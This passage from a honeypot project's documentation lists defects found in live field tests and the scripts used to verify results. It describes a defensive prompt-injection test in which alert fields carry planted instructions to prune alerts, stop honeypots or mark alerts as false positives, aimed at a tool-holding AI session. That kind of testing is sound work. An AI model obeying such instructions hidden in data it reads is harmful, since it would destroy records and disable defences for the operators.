| NFS: `showmount -e` could not work (port 111 closed); the portmapper answered every version in v2 format | `showmount`, `rpcinfo`, nmap `nfs-*` | 111 and 2049 redirected to one internal port; v2, v3, v4 and `PROG_MISMATCH` | nmap identifies `rpcbind 2-4` and `nfs 3-4`; `nfs_export_enumeration` recorded |
| Seven extra ports reachable (1110, 1143, 1389, 2121, 4445, 8080, 8873): post-redirect ports answered directly | Full 65,535-port connect scan from outside | Firewall accepts redirect targets only for DNAT'd packets (`ct status dnat`) | Pinned against real nftables by `tests/integration/test_firewall_rules.py` |
| DNS: UDP only (TCP zone transfer refused, unrecorded), `version.bind` answered with SPF, `ANY` gave NXDOMAIN, `aa ra ad` set together | Real `dig`, `nmap`, `smtplib` | TCP/53, CHAOS answers, RFC 8482 `ANY`, resolver flags | Fixed; DNS stayed off on the public host |
| LDAP clock frozen six days back, MySQL thread id always 12345, uptimes never advancing, three kernels on one IP | nmap NSE scripts, run twice | Live clock, rising ids, one shared host identity | Pinned by `tests/unit/test_engine_identity.py` |
| `rsync` timed out after module selection (protocol 30+ sends arguments NUL-separated); Cowrie rejected `head -2`; `uptime` read minutes after every restart | Real `rsync` and OpenSSH clients | `engines/rsync_wire.py`; per-hostname boot offset | `rsync rsync://host/module/` lists a decoy tree and exits 0 |
| The bait was unreachable: Cowrie's was in the persona user's home but attackers log in as `root` or `admin`; the HTTP decoys served random secrets, so no scanner could find a tracked one | A real SSH session listing `/root`; reading the decoys | Bait in `/root`; the tracked credential served in `/.env`, `/config.json`, `/wp-config.php` | Proven from outside (read `/.env`, replay on MySQL: CRITICAL); then the 8 trips in section 3 |
| RDP connections from the internet filed as Lateral Movement; journeys with a 2,570-event phase and no technique | Reading `attack_summary` as an analyst | T1133 for connections; techniques from exact counts | 4,888 alerts re-filed from T1021.001 to T1133 |
| `honeypot_pause` returned `paused` while the port kept answering; a triage filter re-selected the newest 500 and overwrote the first analyst's disposition; `http_active_recon` overwrote `http_credential_submit` | `field_test_ops.py`, `field_test.py` | In-process pause closes the listener; filters select untriaged alerts only; only a plain probe is relabelled | `hp-vnc`'s port closed on pause and reopened on resume |

*Sources: `../CHANGELOG.md` and `FIELD_TEST.md` ("What the first live run found", "Later rounds", "Live checks that no script can replace"). The numbers were not re-measured for this page.*

## 6. Method and honesty

| Script | Question | Last recorded result |
|---|---|---|
| `scripts/field_test.py` | Does each engine record what a real client does to it, from outside? | 23 of 23 engines recorded, 0 probes failed (run 2026-10-16 00:17 UTC) |
| `scripts/field_test_tools.py` | Does every tool work at its role, and are other roles refused? | 70 tools registered, 70 called or skipped with a reason (3 skipped); 86 checks, 1 failed (2026-10-15 20:49) |
| `scripts/field_test_ops.py` | Are management and analysis answers right on real traffic? | 20 checks, 0 failed |
| `scripts/field_test_oracle.py` | Do the read tools' numbers equal an independent SQL computation? | 73 checks, 0 failed on 17,539,280 alerts |
| `scripts/field_test_injection.py` | Can attacker-written text steer a model that holds every tool? | All three scenarios held (one model, one sample each) |

*Run reports (`field-report-final.md`, `tools-final.md`, `ops-final.md`, `oracle-final.md`) are not part of the repository; the scripts that produce them and `FIELD_TEST.md` are.*

- **The oracle is the check on this page's totals.** It runs the read tools on a copy of a frozen backup and compares each answer with plain SQL over `alerts`, never over rollups: `alerts_stats` in five window shapes, per-sensor counts, `soc_brief`, `threat_timeline`, attacker profiles and journeys (first and last seen to the microsecond), blocklist membership, `analyze_campaign`, `fingerprint_clusters`. The final run used the backup taken at 13:05 UTC on the last day (17,539,280 alerts), about 1.6 hours before the backup used here. To show it can fail, one rollup count was changed by one in a copy on the first run and the total, severity split, top sources and per-sensor hits all failed. `map_ttps` is the one tool it does not cover.
- **The tool sweep's one failure** is the `sql_query` check that the `honeytokens` table is refused. The report line carries the server's refusal text, so the table was refused and the failure looks like a mismatch in what the check expected; it was not investigated or re-run for this page.
- **The prompt-injection test** plants alerts whose fields carry instructions (bulk false-positive triage, `alerts_prune`, `honeypot_stop`, `report_ip_abuse`, `export_blocklist`; in a command, user agent, username, path and JSON blob) into a copy of a real backup and gives a real `claude -p` session every tool pre-approved. It then checks the database and the tool-call stream, not the model's account. In all three scenarios (summarise, triage, investigate) the model read the payloads in full, called only read tools or the one `alerts_acknowledge` it was asked for, and changed nothing else; twice it named the attack. **One model and one sample per scenario: evidence, not proof.** The guidance that follows is the role system: an unattended agent gets a `viewer` token.
- **Not verified live:** GreyNoise enrichment (the free key needs a business email); the pfSense, Cloudflare and AWS WAF blocklist push tools (rewritten to the vendors' published contracts after a review found four defects; tested against strict stubs and botocore's `Stubber`, never against a real account); the cloud-key honeytokens (needs an audit-log forwarder; the Terraform was never applied); SMTP and DNS on the public internet (off by design, tested locally with `smtplib`, `dig`, `nmap`).
- **Limits of what this data shows.** These are protocol facades, so the population is automated scanners and bots: the platform does not claim to see a skilled human. Five days from one address is a sample of one network position, not a census. A country is the geolocation of the source address, and GeoIP covers only CRITICAL alerts. ATT&CK mapping is by event type with regular expressions and has not been checked against analyst labels. A few CRITICAL event types above were reached only by the operator's own tests.
- **The labels are the project's own.** Severity, event types and the ATT&CK mapping come from the engines and `intel/mitre.py`; the figures here are only as good as those classifiers. The unit suite was not run for this page.

Reproduce on your own deployment with `scripts/field_test.py`, `scripts/analyze_backup.py <backup>` and the queries above; `FIELD_TEST.md` describes each script.
